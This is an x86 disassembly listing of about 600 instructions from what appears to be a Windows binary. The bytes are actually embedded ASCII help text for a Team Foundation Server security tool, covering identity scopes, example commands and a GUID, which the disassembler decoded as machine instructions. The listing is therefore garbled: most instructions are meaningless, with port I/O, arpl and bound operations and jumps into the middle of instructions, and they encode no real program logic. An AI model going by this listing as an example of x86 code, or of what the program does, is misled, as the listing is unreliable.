  406d84:	js     0x406deb
  406d86:	jae    0x406dc2
  406d88:	or     eax,0x2020200a
  406d8d:	and    BYTE PTR [eax],ah
  406d8f:	and    BYTE PTR [eax],ah
  406d91:	and    BYTE PTR [eax],ah
  406d93:	and    BYTE PTR [eax],ah
  406d95:	and    BYTE PTR [eax],ah
  406d97:	and    BYTE PTR [eax],ah
  406d99:	and    BYTE PTR [esi+0x3a],ch
  406d9c:	and    al,BYTE PTR [esi+0x75]
  406d9f:	ins    BYTE PTR es:[edi],dx
  406da0:	ins    BYTE PTR es:[edi],dx
  406da1:	sub    eax,0x656d6974
  406da6:	and    BYTE PTR [ebp+0x6d],al
  406da9:	jo     0x406e17
  406dab:	outs   dx,DWORD PTR ds:[esi]
  406dac:	jns    0x406e13
  406dae:	gs jae 0x406dd3
  406db1:	or     eax,0x2020200a
  406db6:	and    BYTE PTR [eax],ah
  406db8:	and    BYTE PTR [eax],ah
  406dba:	and    BYTE PTR [eax],ah
  406dbc:	and    BYTE PTR [eax],ah
  406dbe:	and    BYTE PTR [eax],ah
  406dc0:	and    BYTE PTR [eax],ah
  406dc2:	and    BYTE PTR [esi+0x3a],ch
  406dc5:	xor    BYTE PTR [eax],dh
  406dc7:	popa   
  406dc8:	xor    DWORD PTR [eax],esi
  406dca:	xor    dh,BYTE PTR fs:[ebx]
  406dcd:	sub    eax,0x35346437
  406dd2:	sub    eax,0x39333434
  406dd7:	sub    eax,0x62313839
  406ddc:	sub    eax,0x33623364
  406de1:	xor    BYTE PTR gs:[edx+0x30],ah
  406de5:	bound  esi,QWORD PTR [ecx]
  406de7:	gs gs pop esp
  406dea:	push   esi
  406deb:	outs   dx,BYTE PTR gs:[esi]
  406ded:	outs   dx,DWORD PTR fs:[esi]
  406def:	jb     0x406e64
  406df1:	or     eax,0x200a0d0a
  406df6:	and    BYTE PTR [eax],ah
  406df8:	and    BYTE PTR [eax],ah
  406dfa:	and    BYTE PTR [eax],ah
  406dfc:	and    BYTE PTR [ecx+0x64],ah
  406dff:	ins    DWORD PTR es:[edi],dx
  406e00:	cmp    bl,BYTE PTR [ebx+0x73]
  406e03:	arpl   WORD PTR [edi+0x70],bp
  406e06:	gs pop ebp
  406e08:	and    BYTE PTR ds:0x66655220,ch
  406e0e:	gs jb  0x406e76
  406e11:	outs   dx,BYTE PTR ds:[esi]
  406e12:	arpl   WORD PTR [ebp+0x73],sp
  406e15:	and    BYTE PTR [eax+ebp*2+0x65],dh
  406e19:	and    BYTE PTR [ecx+0x64],ah
  406e1c:	ins    DWORD PTR es:[edi],dx
  406e1d:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  406e24:	je     0x406e8f
  406e26:	jbe    0x406e8d
  406e28:	and    BYTE PTR [ecx+0x70],ah
  406e2b:	jo     0x406e99
  406e2d:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  406e34:	and    BYTE PTR [edi+0x72],ah
  406e37:	outs   dx,DWORD PTR ds:[esi]
  406e38:	jne    0x406eaa
  406e3a:	and    BYTE PTR [esi+0x6f],ah
  406e3d:	jb     0x406e5f
  406e3f:	je     0x406ea9
  406e41:	and    BYTE PTR gs:[ebx+0x63],dh
  406e45:	outs   dx,DWORD PTR ds:[esi]
  406e46:	jo     0x406ead
  406e48:	sub    al,0x20
  406e4a:	jae    0x406ec1
  406e4c:	arpl   WORD PTR [eax+0x20],bp
  406e4f:	popa   
  406e50:	jae    0x406e72
  406e52:	and    dl,BYTE PTR [ebp+eiz*2+0x61]
  406e56:	ins    DWORD PTR es:[edi],dx
  406e57:	and    BYTE PTR [esi+0x6f],al
  406e5a:	jne    0x406eca
  406e5c:	fs popa 
  406e5e:	je     0x406ec9
  406e60:	outs   dx,DWORD PTR ds:[esi]
  406e61:	outs   dx,BYTE PTR ds:[esi]
  406e62:	and    BYTE PTR [ecx+0x64],al
  406e65:	ins    DWORD PTR es:[edi],dx
  406e66:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  406e6d:	je     0x406ede
  406e6f:	jb     0x406ee4
  406e71:	and    ah,BYTE PTR [eax]
  406e73:	outs   dx,WORD PTR ds:[esi]
  406e75:	jb     0x406e97
  406e77:	je     0x406ee1
  406e79:	and    BYTE PTR gs:[ecx+0x6e],ch
  406e7d:	jae    0x406ef3
  406e7f:	popa   
  406e80:	outs   dx,BYTE PTR ds:[esi]
  406e81:	arpl   WORD PTR [ebp+0x2d],sp
  406e84:	ins    BYTE PTR es:[edi],dx
  406e85:	gs jbe 0x406eed
  406e88:	ins    BYTE PTR es:[edi],dx
  406e89:	sub    al,0x20
  406e8b:	outs   dx,DWORD PTR ds:[esi]
  406e8c:	jb     0x406eae
  406e8e:	and    dl,BYTE PTR [eax+0x72]
  406e91:	outs   dx,DWORD PTR ds:[esi]
  406e92:	push   0x65
  406e94:	arpl   WORD PTR [eax+eiz*1+0x43],si
  406e98:	outs   dx,DWORD PTR ds:[esi]
  406e99:	ins    BYTE PTR es:[edi],dx
  406e9a:	ins    BYTE PTR es:[edi],dx
  406e9b:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406ea0:	outs   dx,BYTE PTR ds:[esi]
  406ea1:	and    BYTE PTR [ecx+0x64],al
  406ea4:	ins    DWORD PTR es:[edi],dx
  406ea5:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  406eac:	je     0x406f1d
  406eae:	jb     0x406f23
  406eb0:	and    ah,BYTE PTR [eax]
  406eb2:	popa   
  406eb3:	je     0x406ed5
  406eb5:	je     0x406f1f
  406eb7:	and    BYTE PTR gs:[ebx+0x6f],ah
  406ebb:	ins    BYTE PTR es:[edi],dx
  406ebc:	ins    BYTE PTR es:[edi],dx
  406ebd:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406ec2:	outs   dx,BYTE PTR ds:[esi]
  406ec3:	sub    eax,0x6576656c
  406ec8:	ins    BYTE PTR es:[edi],dx
  406ec9:	and    BYTE PTR cs:[eax+ebp*2+0x65],dl
  406ece:	and    BYTE PTR [edi+0x70],ch
  406ed1:	je     0x406f3c
  406ed3:	outs   dx,DWORD PTR ds:[esi]
  406ed4:	outs   dx,BYTE PTR ds:[esi]
  406ed5:	popa   
  406ed6:	ins    BYTE PTR es:[edi],dx
  406ed7:	and    BYTE PTR [eax+0x61],dh
  406eda:	jb     0x406f3d
  406edc:	ins    DWORD PTR es:[edi],dx
  406edd:	gs je  0x406f45
  406ee0:	jb     0x406f02
  406ee2:	jae    0x406f47
  406ee4:	outs   dx,DWORD PTR ds:[esi]
  406ee5:	jo     0x406f4c
  406ee7:	and    BYTE PTR [ecx+0x73],ch
  406eea:	and    BYTE PTR [ecx+0x20],ah
  406eed:	jo     0x406f61
  406eef:	outs   dx,DWORD PTR ds:[esi]
  406ef0:	push   0x65
  406ef2:	arpl   WORD PTR [eax+eiz*1+0x55],si
  406ef6:	push   edx
  406ef7:	dec    ecx
  406ef8:	and    BYTE PTR [edi+0x72],ch
  406efb:	and    BYTE PTR [ebp+0x52],dl
  406efe:	dec    esp
  406eff:	sub    al,0x20
  406f01:	imul   ebp,DWORD PTR [esi+0x63],0x6964756c
  406f08:	outs   dx,BYTE PTR ds:[esi]
  406f09:	and    BYTE PTR [bx+di+0x74],ch
  406f0d:	jae    0x406f2f
  406f0f:	inc    edi
  406f10:	push   ebp
  406f11:	dec    ecx
  406f12:	inc    esp
  406f13:	and    BYTE PTR [ecx+0x6e],ah
  406f16:	and    BYTE PTR fs:[ebx+0x6f],ah
  406f1a:	outs   dx,BYTE PTR ds:[esi]
  406f1b:	outs   dx,BYTE PTR ds:[esi]
  406f1c:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406f21:	outs   dx,BYTE PTR ds:[esi]
  406f22:	and    BYTE PTR [ebx+0x74],dh
  406f25:	jb     0x406f90
  406f27:	outs   dx,BYTE PTR ds:[esi]
  406f28:	and    BYTE PTR cs:[bx+di+0x66],cl
  406f2d:	and    BYTE PTR [ebx+0x63],dh
  406f30:	outs   dx,DWORD PTR ds:[esi]
  406f31:	jo     0x406f98
  406f33:	and    BYTE PTR [ecx+0x73],ch
  406f36:	and    BYTE PTR [edi+0x6d],ch
  406f39:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x74202c64
  406f41:	push   0x65732065
  406f46:	jb     0x406fbe
  406f48:	gs jb  0x406f6b
  406f4b:	outs   dx,DWORD PTR ds:[esi]
  406f4c:	jb     0x406f6e
  406f4e:	arpl   WORD PTR [edi+0x6c],bp
  406f51:	ins    BYTE PTR es:[edi],dx
  406f52:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406f57:	outs   dx,BYTE PTR ds:[esi]
  406f58:	and    BYTE PTR [ebx+0x63],dh
  406f5b:	outs   dx,DWORD PTR ds:[esi]
  406f5c:	jo     0x406fc3
  406f5e:	and    BYTE PTR [ecx+0x73],ch
  406f61:	and    BYTE PTR [ecx+0x73],ah
  406f64:	jae    0x406fdb
  406f66:	ins    DWORD PTR es:[edi],dx
  406f67:	gs and BYTE PTR fs:[edx+0x61],ah
  406f6c:	jae    0x406fd3
  406f6e:	and    BYTE PTR fs:[edi+0x6e],ch
  406f72:	and    BYTE PTR [edi+0x68],dh
  406f75:	gs je  0x406fe0
  406f78:	gs jb  0x406f9b
  406f7b:	je     0x406fe5
  406f7d:	and    BYTE PTR gs:[edi],ch
  406f80:	jae    0x406fe7
  406f82:	jb     0x406ffa
  406f84:	gs jb  0x406fa7
  406f87:	outs   dx,DWORD PTR ds:[esi]
  406f88:	jb     0x406faa
  406f8a:	das    
  406f8b:	arpl   WORD PTR [edi+0x6c],bp
  406f8e:	ins    BYTE PTR es:[edi],dx
  406f8f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406f94:	outs   dx,BYTE PTR ds:[esi]
  406f95:	and    BYTE PTR [eax+0x61],dh
  406f98:	jb     0x406ffb
  406f9a:	ins    DWORD PTR es:[edi],dx
  406f9b:	gs je  0x407003
  406f9e:	jb     0x406fc0
  406fa0:	imul   esi,DWORD PTR [ebx+0x20],0x64657375
  406fa7:	sub    al,0x20
  406fa9:	bound  esi,QWORD PTR [ebp+0x74]
  406fac:	and    BYTE PTR [eax+ebp*2+0x65],dh
  406fb0:	and    BYTE PTR [ebx+0x6f],ah
  406fb3:	ins    BYTE PTR es:[edi],dx
  406fb4:	outs   dx,DWORD PTR ds:[esi]
  406fb5:	outs   dx,BYTE PTR ds:[esi]
  406fb6:	and    BYTE PTR [ecx+0x73],ch
  406fb9:	and    BYTE PTR [ebx+0x74],dh
  406fbc:	imul   ebp,DWORD PTR [esp+ebp*2+0x20],0x75716572
  406fc4:	imul   esi,DWORD PTR [edx+0x65],0xa0d2e64
  406fcb:	and    BYTE PTR [eax],ah
  406fcd:	and    BYTE PTR [eax],ah
  406fcf:	and    BYTE PTR [eax],ah
  406fd1:	and    BYTE PTR [eax],ah
  406fd3:	and    BYTE PTR [eax],ah
  406fd5:	and    BYTE PTR [eax],ah
  406fd7:	inc    ebp
  406fd8:	js     0x40703b
  406fda:	ins    DWORD PTR es:[edi],dx
  406fdb:	jo     0x407049
  406fdd:	cmp    ah,BYTE PTR gs:[eax]
  406fe0:	and    BYTE PTR [ecx+0x64],ah
  406fe3:	ins    DWORD PTR es:[edi],dx
  406fe4:	cmp    dh,BYTE PTR [esi+0x73]
  406fe7:	je     0x40704f
  406fe9:	jae    0x407025
  406feb:	das    
  406fec:	das    
  406fed:	das    
  406fee:	inc    ebx
  406fef:	ins    BYTE PTR es:[edi],dx
  406ff0:	popa   
  406ff1:	jae    0x407066
  406ff3:	imul   esp,DWORD PTR [esi+0x69],0x69746163
  406ffa:	outs   dx,DWORD PTR ds:[esi]
  406ffb:	outs   dx,BYTE PTR ds:[esi]
  406ffc:	das    
  406ffd:	push   esp
  406ffe:	gs popa 
  407000:	ins    DWORD PTR es:[edi],dx
  407001:	push   eax
  407002:	jb     0x407073
  407004:	push   0x65
  407006:	arpl   WORD PTR [edi+ebp*1+0x47],si
  40700a:	push   ebp
  40700b:	dec    ecx
  40700c:	inc    esp
  40700d:	and    BYTE PTR ds:0x200a0d0a,cl
  407013:	and    BYTE PTR [eax],ah
  407015:	and    BYTE PTR [eax],ah
  407017:	and    BYTE PTR [eax],ah
  407019:	and    BYTE PTR [ebx+0x72],dh
  40701c:	jbe    0x407058
  40701e:	and    BYTE PTR ds:0x66655220,ch
  407024:	gs jb  0x40708c
  407027:	outs   dx,BYTE PTR ds:[esi]
  407028:	arpl   WORD PTR [ebp+0x73],sp
  40702b:	and    BYTE PTR [eax+ebp*2+0x65],dh
  40702f:	and    BYTE PTR [ecx+0x70],ah
  407032:	jo     0x4070a0
  407034:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40703b:	and    BYTE PTR [edi+0x72],ah
  40703e:	outs   dx,DWORD PTR ds:[esi]
  40703f:	jne    0x4070b1
  407041:	and    BYTE PTR [esi+0x6f],ah
  407044:	jb     0x407066
  407046:	jae    0x4070ad
  407048:	jb     0x4070c0
  40704a:	imul   esp,DWORD PTR [ebx+0x65],0x63636120
  407051:	outs   dx,DWORD PTR ds:[esi]
  407052:	jne    0x4070c2
  407054:	je     0x4070c9
  407056:	cs or  eax,0x200a0d0a
  40705c:	and    BYTE PTR [eax],ah
  40705e:	and    BYTE PTR [eax],ah
  407060:	and    BYTE PTR [eax],ah
  407062:	and    BYTE PTR [ecx+0x6c],ah
  407065:	ins    BYTE PTR es:[edi],dx
  407066:	cmp    ah,BYTE PTR [eax]
  407068:	sub    eax,0x66655220
  40706d:	gs jb  0x4070d5
  407070:	outs   dx,BYTE PTR ds:[esi]
  407071:	arpl   WORD PTR [ebp+0x73],sp
  407074:	and    BYTE PTR [ecx+0x6c],ah
  407077:	ins    BYTE PTR es:[edi],dx
  407078:	and    BYTE PTR [edi+0x72],ah
  40707b:	outs   dx,DWORD PTR ds:[esi]
  40707c:	jne    0x4070ee
  40707e:	jae    0x4070a0
  407080:	popa   
  407081:	outs   dx,BYTE PTR ds:[esi]
  407082:	and    BYTE PTR fs:[ecx+0x64],ch
  407086:	outs   dx,BYTE PTR gs:[esi]
  407088:	je     0x4070f3
  40708a:	je     0x4070f5
  40708c:	gs jae 0x4070bd
  40708f:	add    esp,ebp
  407091:	or     BYTE PTR [ebp+0x78],al
  407094:	popa   
  407095:	ins    DWORD PTR es:[edi],dx
  407096:	jo     0x407104
  407098:	gs jae 0x4070bb
  40709b:	outs   dx,DWORD PTR ds:[esi]
  40709c:	data16 and BYTE PTR [esi+eax*2+0x53],dl
  4070a1:	push   ebx
  4070a2:	arpl   WORD PTR gs:[ebp+0x72],si
  4070a6:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x6d6d6f63
  4070ae:	popa   
  4070af:	outs   dx,BYTE PTR ds:[esi]
  4070b0:	fs jae 0x4070d3
  4070b3:	popa   
  4070b4:	outs   dx,BYTE PTR ds:[esi]
  4070b5:	and    BYTE PTR fs:[ebx+0x79],dh
  4070b9:	outs   dx,BYTE PTR ds:[esi]
  4070ba:	je     0x40711d
  4070bc:	js     0x4070f8
  4070be:	or     eax,0x540a0d0a
  4070c3:	push   0x6f662065
  4070c8:	ins    BYTE PTR es:[edi],dx
  4070c9:	ins    BYTE PTR es:[edi],dx
  4070ca:	outs   dx,DWORD PTR ds:[esi]
  4070cb:	ja     0x407136
  4070cd:	outs   dx,BYTE PTR ds:[esi]
  4070ce:	and    BYTE PTR [di+0x78],ah
  4070d2:	popa   
  4070d3:	ins    DWORD PTR es:[edi],dx
  4070d4:	jo     0x407142
  4070d6:	and    BYTE PTR gs:[ecx+ebp*2+0x73],ah
  4070db:	jo     0x407149
  4070dd:	popa   
  4070de:	jns    0x407153
  4070e0:	and    BYTE PTR [ecx+0x64],ch
  4070e3:	outs   dx,BYTE PTR gs:[esi]
  4070e5:	je     0x407150
  4070e7:	je     0x407162
  4070e9:	and    BYTE PTR [ecx+0x6e],ch
  4070ec:	outs   dx,WORD PTR ds:[esi]
  4070ee:	jb     0x40715d
  4070f0:	popa   
  4070f1:	je     0x40715c
  4070f3:	outs   dx,DWORD PTR ds:[esi]
  4070f4:	outs   dx,BYTE PTR ds:[esi]
  4070f5:	and    BYTE PTR [esi+0x6f],ah
  4070f8:	jb     0x40711a
  4070fa:	je     0x407164
  4070fc:	and    BYTE PTR gs:[edx],ah
  4070ff:	push   esp
  407100:	gs popa 
  407102:	ins    DWORD PTR es:[edi],dx
  407103:	and    BYTE PTR [esi+0x6f],al
  407106:	jne    0x407176
  407108:	fs popa 
  40710a:	je     0x407175
  40710c:	outs   dx,DWORD PTR ds:[esi]
  40710d:	outs   dx,BYTE PTR ds:[esi]
  40710e:	and    BYTE PTR [ecx+0x64],al
  407111:	ins    DWORD PTR es:[edi],dx
  407112:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  407119:	je     0x40718a
  40711b:	jb     0x407190
  40711d:	and    ah,BYTE PTR [eax]
  40711f:	addr16 jb 0x407191
  407122:	jne    0x407194
  407124:	and    BYTE PTR [edi+0x6e],ch
  407127:	and    BYTE PTR [eax+ebp*2+0x65],dh
  40712b:	and    BYTE PTR [ecx+0x70],ah
  40712e:	jo     0x40719c
  407130:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  407137:	and    BYTE PTR [ecx+ebp*2+0x65],dh
  40713b:	jb     0x407177
  40713d:	and    BYTE PTR ds:0x7366740a,cl
  407143:	jae    0x4071aa
  407145:	arpl   WORD PTR [ebp+0x72],si
  407148:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x2220692f
  407150:	push   esp
  407151:	gs popa 
  407153:	ins    DWORD PTR es:[edi],dx
  407154:	and    BYTE PTR [esi+0x6f],al
  407157:	jne    0x4071c7
  407159:	fs popa 
  40715b:	je     0x4071c6
  40715d:	outs   dx,DWORD PTR ds:[esi]
  40715e:	outs   dx,BYTE PTR ds:[esi]
  40715f:	and    BYTE PTR [ecx+0x64],al
  407162:	ins    DWORD PTR es:[edi],dx
  407163:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  40716a:	je     0x4071db
  40716c:	jb     0x4071e1
  40716e:	and    ah,BYTE PTR [eax]
  407170:	das    
  407171:	imul   ebp,DWORD PTR [esi+0x73],0x636e6174
  407178:	cmp    al,BYTE PTR gs:[ecx+0x44]
  40717c:	popa   
  40717d:	je     0x4071f4
  40717f:	ins    DWORD PTR es:[edi],dx
  407180:	inc    ebx
  407181:	outs   dx,DWORD PTR ds:[esi]
  407182:	jb     0x4071f4
  407184:	outs   dx,DWORD PTR ds:[esi]
  407185:	jb     0x4071e8
  407187:	je     0x4071f2
  407189:	outs   dx,DWORD PTR ds:[esi]
  40718a:	outs   dx,BYTE PTR ds:[esi]
  40718b:	cmp    bh,BYTE PTR [eax]
  40718d:	xor    BYTE PTR [eax],bh
  40718f:	xor    BYTE PTR ds:0x540a0d0a,cl
  407195:	push   0x6f662065
  40719a:	ins    BYTE PTR es:[edi],dx
  40719b:	ins    BYTE PTR es:[edi],dx
  40719c:	outs   dx,DWORD PTR ds:[esi]
  40719d:	ja     0x407208
  40719f:	outs   dx,BYTE PTR ds:[esi]
  4071a0:	and    BYTE PTR [di+0x78],ah
  4071a4:	popa   
  4071a5:	ins    DWORD PTR es:[edi],dx
  4071a6:	jo     0x407214
  4071a8:	and    BYTE PTR gs:[edi+0x72],ah
  4071ac:	popa   
  4071ad:	outs   dx,BYTE PTR ds:[esi]
  4071ae:	je     0x407223
  4071b0:	and    BYTE PTR [eax+ebp*2+0x65],dh
  4071b4:	and    BYTE PTR [ecx+0x6e],ch
  4071b7:	jae    0x40722d
  4071b9:	popa   
  4071ba:	outs   dx,BYTE PTR ds:[esi]
  4071bb:	arpl   WORD PTR [ebp+0x2d],sp
  4071be:	ins    BYTE PTR es:[edi],dx
  4071bf:	gs jbe 0x407227
  4071c2:	ins    BYTE PTR es:[edi],dx
  4071c3:	and    BYTE PTR [edx],ah
  4071c5:	push   esi
  4071c6:	imul   esp,DWORD PTR [ebp+0x77],0x736e6920
  4071cd:	je     0x407230
  4071cf:	outs   dx,BYTE PTR ds:[esi]
  4071d0:	arpl   WORD PTR [ebp+0x2d],sp
  4071d3:	ins    BYTE PTR es:[edi],dx
  4071d4:	gs jbe 0x40723c
  4071d7:	ins    BYTE PTR es:[edi],dx
  4071d8:	and    BYTE PTR [ecx+0x6e],ch
  4071db:	outs   dx,WORD PTR ds:[esi]
  4071dd:	jb     0x40724c
  4071df:	popa   
  4071e0:	je     0x40724b
  4071e2:	outs   dx,DWORD PTR ds:[esi]
  4071e3:	outs   dx,BYTE PTR ds:[esi]
  4071e4:	and    ah,BYTE PTR [eax]
  4071e6:	jo     0x40724d
  4071e8:	jb     0x407257
  4071ea:	imul   esi,DWORD PTR [ebx+0x73],0x206e6f69
  4071f1:	je     0x407262
  4071f3:	and    BYTE PTR [eax+ebp*2+0x65],dh
  4071f7:	and    BYTE PTR [ecx+0x44],al
  4071fa:	popa   
  4071fb:	je     0x407272
  4071fd:	ins    DWORD PTR es:[edi],dx
  4071fe:	inc    ebx
  4071ff:	outs   dx,DWORD PTR ds:[esi]
  407200:	jb     0x407272
  407202:	outs   dx,DWORD PTR ds:[esi]
  407203:	jb     0x407266
  407205:	je     0x407270
  407207:	outs   dx,DWORD PTR ds:[esi]
  407208:	outs   dx,BYTE PTR ds:[esi]
  407209:	and    BYTE PTR [ebp+eiz*2+0x70],ah
  40720d:	ins    BYTE PTR es:[edi],dx
  40720e:	outs   dx,DWORD PTR ds:[esi]
  40720f:	jns    0x40727e
  407211:	outs   dx,BYTE PTR gs:[esi]
  407213:	je     0x407235
  407215:	outs   dx,WORD PTR ds:[esi]
  407217:	jb     0x407239
  407219:	je     0x407283
  40721b:	and    BYTE PTR gs:[ecx+eiz*2+0x74],al
  407220:	jne    0x40728f
  407222:	xor    DWORD PTR [eax],esp
  407224:	outs   dx,DWORD PTR fs:[esi]
  407226:	ins    DWORD PTR es:[edi],dx
  407227:	popa   
  407228:	imul   ebp,DWORD PTR [esi+0x20],0x72657375
  40722f:	and    BYTE PTR [edx+0x6f],cl
  407232:	push   0x6550206e
  407237:	outs   dx,DWORD PTR ds:[esi]
  407238:	jo     0x4072a6
  40723a:	gs jae 0x40725d
  40723d:	sub    BYTE PTR [ecx+eiz*2+0x74],al
  407241:	jne    0x4072b0
  407243:	xor    DWORD PTR [edx+ebp*2+0x70],ebx
  407247:	outs   dx,DWORD PTR gs:[esi]
  407249:	jo     0x4072b7
  40724b:	gs jae 0x407277
  40724e:	cmp    cl,BYTE PTR ds:0x66743e0a
  407254:	jae    0x4072c9
  407256:	arpl   WORD PTR gs:[ebp+0x72],si
  40725a:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x202b612f
  407262:	push   ebx
  407263:	gs jb  0x4072dc
  407266:	gs jb  0x407289
  407269:	inc    esi
  40726a:	jb     0x4072cd
  40726c:	ins    DWORD PTR es:[edi],dx
  40726d:	gs ja  0x4072df
  407270:	jb     0x4072dd
  407272:	inc    edi
  407273:	ins    BYTE PTR es:[edi],dx
  407274:	outs   dx,DWORD PTR ds:[esi]
  407275:	bound  esp,QWORD PTR [ecx+0x6c]
  407278:	push   ebx
  407279:	arpl   WORD PTR gs:[ebp+0x72],si
  40727d:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x656e6547
  407285:	jb     0x4072f0
  407287:	arpl   WORD PTR [edx+0x65],dx
  40728a:	popa   
  40728b:	and    BYTE PTR fs:[esi+0x3a],ch
  40728f:	inc    esp
  407290:	popa   
  407291:	je     0x407308
  407293:	ins    DWORD PTR es:[edi],dx
  407294:	xor    DWORD PTR [edx+ebp*2+0x70],ebx
  407298:	outs   dx,DWORD PTR gs:[esi]
  40729a:	jo     0x407308
  40729c:	gs jae 0x4072bf
  40729f:	inc    ecx
  4072a0:	dec    esp
  4072a1:	dec    esp
  4072a2:	dec    edi
  4072a3:	push   edi
  4072a4:	and    BYTE PTR [edi],ch
  4072a6:	jae    0x40730d
  4072a8:	jb     0x407320
  4072aa:	gs jb  0x4072e7
  4072ad:	push   0x3a707474
  4072b2:	das    
  4072b3:	das    
  4072b4:	inc    ecx
  4072b5:	inc    esp
  4072b6:	popa   
  4072b7:	je     0x40732e
  4072b9:	ins    DWORD PTR es:[edi],dx
  4072ba:	inc    ebx
  4072bb:	outs   dx,DWORD PTR ds:[esi]
  4072bc:	jb     0x40732e
  4072be:	outs   dx,DWORD PTR ds:[esi]
  4072bf:	jb     0x407322
  4072c1:	je     0x40732c
  4072c3:	outs   dx,DWORD PTR ds:[esi]
  4072c4:	outs   dx,BYTE PTR ds:[esi]
  4072c5:	cmp    bh,BYTE PTR [eax]
  4072c7:	xor    BYTE PTR [eax],bh
  4072c9:	xor    BYTE PTR [eax],ah
  4072cb:	or     eax,0x540a0d0a
  4072d0:	push   0x6f662065
  4072d5:	ins    BYTE PTR es:[edi],dx
  4072d6:	ins    BYTE PTR es:[edi],dx
  4072d7:	outs   dx,DWORD PTR ds:[esi]
  4072d8:	ja     0x407343
  4072da:	outs   dx,BYTE PTR ds:[esi]
  4072db:	and    BYTE PTR [di+0x78],ah
  4072df:	popa   
  4072e0:	ins    DWORD PTR es:[edi],dx
  4072e1:	jo     0x40734f
  4072e3:	and    BYTE PTR gs:[ebx+0x68],ah
  4072e7:	arpl   WORD PTR gs:[ebx+0x73],bp
  4072eb:	and    BYTE PTR [ecx+0x66],ch
  4072ee:	and    BYTE PTR [eax+ebp*2+0x65],dh
  4072f2:	and    BYTE PTR [ebp+0x73],dh
  4072f5:	gs jb  0x407318
  4072f8:	and    al,BYTE PTR [ecx+eiz*2+0x74]
  4072fc:	jne    0x40736b
  4072fe:	xor    DWORD PTR [edx+ebp*2+0x70],ebx
  407302:	outs   dx,DWORD PTR gs:[esi]
  407304:	jo     0x407372
  407306:	gs jae 0x40732b
  407309:	and    BYTE PTR [edx+0x65],ah
  40730c:	ins    BYTE PTR es:[edi],dx
  40730d:	outs   dx,DWORD PTR ds:[esi]
  40730e:	outs   dx,BYTE PTR ds:[esi]
  40730f:	addr16 jae 0x407332
  407312:	je     0x407383
  407314:	and    BYTE PTR [eax+ebp*2+0x65],dh
  407318:	and    BYTE PTR [ebp+eiz*2+0x61],dl
  40731c:	ins    DWORD PTR es:[edi],dx
  40731d:	and    BYTE PTR [esi+0x6f],al
  407320:	jne    0x407390
  407322:	fs popa 
  407324:	je     0x40738f
  407326:	outs   dx,DWORD PTR ds:[esi]
  407327:	outs   dx,BYTE PTR ds:[esi]
  407328:	and    BYTE PTR [ecx+0x64],al
  40732b:	ins    DWORD PTR es:[edi],dx
  40732c:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  407333:	je     0x4073a4
  407335:	jb     0x4073aa
  407337:	and    BYTE PTR [ecx+0x6e],ch
  40733a:	jae    0x4073b0
  40733c:	popa   
  40733d:	outs   dx,BYTE PTR ds:[esi]
  40733e:	arpl   WORD PTR [ebp+0x2d],sp
  407341:	ins    BYTE PTR es:[edi],dx
  407342:	gs jbe 0x4073aa
  407345:	ins    BYTE PTR es:[edi],dx
  407346:	and    BYTE PTR [edi+0x72],ah
  407349:	outs   dx,DWORD PTR ds:[esi]
  40734a:	jne    0x4073bc
  40734c:	cmp    cl,BYTE PTR ds:0x46543e0a
  407352:	push   ebx
  407353:	push   ebx
  407354:	arpl   WORD PTR gs:[ebp+0x72],si
  407358:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x22206d2f
  407360:	push   esp
  407361:	gs popa 
  407363:	ins    DWORD PTR es:[edi],dx
  407364:	and    BYTE PTR [esi+0x6f],al
  407367:	jne    0x4073d7
  407369:	fs popa 
  40736b:	je     0x4073d6
  40736d:	outs   dx,DWORD PTR ds:[esi]
  40736e:	outs   dx,BYTE PTR ds:[esi]
  40736f:	and    BYTE PTR [ecx+0x64],al
  407372:	ins    DWORD PTR es:[edi],dx
  407373:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  40737a:	je     0x4073eb
  40737c:	jb     0x4073f1
  40737e:	and    ah,BYTE PTR [eax]
  407380:	outs   dx,BYTE PTR ds:[esi]
  407381:	cmp    al,BYTE PTR [ecx+eiz*2+0x74]
  407385:	jne    0x4073f4
  407387:	xor    DWORD PTR [edx+ebp*2+0x70],ebx
  40738b:	outs   dx,DWORD PTR gs:[esi]
  40738d:	jo     0x4073fb
  40738f:	gs jae 0x4073b2
  407392:	das    
  407393:	jae    0x4073fa
  407395:	jb     0x40740d
  407397:	gs jb  0x4073d4
  40739a:	push   0x3a707474
  40739f:	das    
  4073a0:	das    
  4073a1:	inc    ecx
  4073a2:	inc    esp
  4073a3:	popa   
  4073a4:	je     0x40741b
  4073a6:	ins    DWORD PTR es:[edi],dx
  4073a7:	inc    ebx
  4073a8:	outs   dx,DWORD PTR ds:[esi]
  4073a9:	jb     0x40741b
  4073ab:	outs   dx,DWORD PTR ds:[esi]
  4073ac:	jb     0x40740f
  4073ae:	je     0x407419
  4073b0:	outs   dx,DWORD PTR ds:[esi]
  4073b1:	outs   dx,BYTE PTR ds:[esi]
  4073b2:	cmp    bh,BYTE PTR [eax]
  4073b4:	xor    BYTE PTR [eax],bh
  4073b6:	xor    BYTE PTR ds:0x540a0d0a,cl
  4073bc:	push   0x6f662065
  4073c1:	ins    BYTE PTR es:[edi],dx
  4073c2:	ins    BYTE PTR es:[edi],dx
  4073c3:	outs   dx,DWORD PTR ds:[esi]
  4073c4:	ja     0x40742f
  4073c6:	outs   dx,BYTE PTR ds:[esi]
  4073c7:	and    BYTE PTR [di+0x78],ah
  4073cb:	popa   
  4073cc:	ins    DWORD PTR es:[edi],dx
  4073cd:	jo     0x40743b
